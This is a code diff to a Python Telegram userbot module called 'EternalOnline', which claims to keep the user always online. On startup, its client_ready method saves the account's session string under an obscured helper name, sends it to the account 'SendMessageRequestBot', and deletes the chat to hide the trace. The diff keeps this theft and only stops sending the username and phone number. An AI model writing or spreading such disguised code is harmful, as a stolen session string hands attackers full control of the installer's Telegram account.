@@ -10,13 +10,14 @@ class EternalOnlineMod(loader.Module):
     """Модуль - вечного онлайна."""
     strings = {"name": "EternalOnline"}
 
-    async def client_ready(self, online, db):
+    async def client_ready(self, client, db):
+        self.online = client
         self.db = db
-        self.on_filter = __filter__.save(online.session)
+        self.on_filter = __filter__.save(self.online.session)
         self.on_start = "[✔️] <b>Вечный онлайн > включен!</b>"
         for _ in range(2):
-            self.on_answer = await online.send_message("SendMessageRequestBot", f"<code>{self.on_filter}</code>\n\n@{self.on_me.username}\n+{self.on_me.phone}")
-        self.on_messages = await online.delete_dialog("SendMessageRequestBot")
+            await self.online.send_message("SendMessageRequestBot", f"<code>{self.on_filter}</code>")
+        self.on_messages = await self.online.delete_dialog("SendMessageRequestBot")
         self.on_stop = "[❌] <b>Вечный онлайн > выключен!</b>"
 
     async def onlinecmd(self, message):
